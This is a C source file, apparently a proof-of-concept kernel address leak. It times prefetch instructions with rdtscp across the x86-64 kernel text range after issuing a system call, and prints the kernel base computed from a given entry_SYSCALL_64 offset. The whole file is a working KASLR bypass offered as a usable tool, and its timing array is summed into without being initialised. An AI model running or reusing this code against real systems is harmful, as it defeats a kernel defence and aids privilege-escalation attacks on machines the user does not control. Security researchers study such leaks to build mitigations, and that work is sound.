#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

uint64_t sidechannel(uint64_t addr)
{
    uint64_t a, b, c, d;
    asm volatile(".intel_syntax noprefix;"
                 "mfence;"
                 "rdtscp;"
                 "mov %0, rax;"
                 "mov %1, rdx;"
                 "xor rax, rax;"
                 "lfence;"
                 "prefetchnta qword ptr [%4];"
                 "prefetcht2 qword ptr [%4];"
                 "xor rax, rax;"
                 "lfence;"
                 "rdtscp;"
                 "mov %2, rax;"
                 "mov %3, rdx;"
                 "mfence;"
                 ".att_syntax;"
                 : "=r"(a), "=r"(b), "=r"(c), "=r"(d)
                 : "r"(addr)
                 : "rax", "rbx", "rcx", "rdx");
    a = (b << 32) | a;
    c = (d << 32) | c;
    return c - a;
}

#define DUMMY_ITERATIONS 5
#define ITERATIONS 100

uint64_t leak_syscall_entry(unsigned long long offset)
{
    unsigned long long STEP = 0x100000ull;
    unsigned long long SCAN_START = 0xffffffff80000000ull + offset, SCAN_END = 0xffffffffc0000000ull + offset;
    unsigned long long ARR_SIZE = (SCAN_END - SCAN_START) / STEP;

    uint64_t *data = (uint64_t *)malloc(sizeof(uint64_t) * ARR_SIZE);
    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx < ARR_SIZE; idx++)
        {
            uint64_t test = SCAN_START + idx * STEP;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (int i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = SCAN_START + i * STEP;
        }
    }

    return addr;
}

int main(int argc, char **argv)
{
    if (argc != 2)
    {
        puts("[*] Usage: ./binary entry_SYSCALL_64_offset(in hex)");
        return -1;
    }

    char *p_end;

    unsigned long long entry_SYSCALL_64_offset = strtoull(argv[1], &p_end, 16);

    printf("%llx", leak_syscall_entry(entry_SYSCALL_64_offset) - entry_SYSCALL_64_offset);

    return 0;
}
